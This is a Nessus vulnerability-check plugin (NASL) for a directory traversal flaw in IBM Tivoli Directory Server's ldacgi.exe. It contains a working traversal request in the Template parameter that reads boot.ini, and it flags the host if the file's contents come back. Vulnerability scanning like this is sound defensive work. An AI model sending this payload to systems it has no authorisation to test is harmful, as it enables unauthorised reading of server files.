#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(14191); 
 script_version ("$Revision: 1.18 $");
 script_cvs_date("$Date: 2016/11/03 20:40:06 $");

 script_cve_id("CVE-2004-2526");
 script_bugtraq_id(10841);
 script_osvdb_id(8367);

 script_name(english:"Tivoli Directory Server ldacgi.exe Template Parameter Traversal Arbitrary File Access");
 script_summary(english:"IBM Tivoli Directory Traversal");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running IBM Tivoli's Directory Server, a
lightweight LDAP server with a web frontend. 

There is a directory traversal issue in the web frontend of this
program, specifically in the 'ldacgi.exe' CGI.  An attacker may
exploit this flaw to read arbitrary files on the remote system with
the privileges of the web server." );
 script_set_attribute(attribute:"see_also", value:"http://www.oliverkarow.de/research/IDS_directory_traversal.txt" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2004/Aug/29" );
 script_set_attribute(attribute:"see_also", value:"http://www-1.ibm.com/support/docview.wss?uid=swg1IR53631" );
 script_set_attribute(attribute:"solution", value:
"Apply 3.2.2 Fix Pack 4 / 4.1 Fix Pack 3 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/08/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/08/02");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:tivoli_directory_server");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

w = http_send_recv3(method:"GET", port: port,
 item:"/ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252");
if (isnull(w)) exit(1, "the web server did not answer");
res = strcat(w[0], w[1], '\r\n', w[2]);
   
if ("[boot loader]" >< res )
{
  security_warning(port);
  exit(0);
}
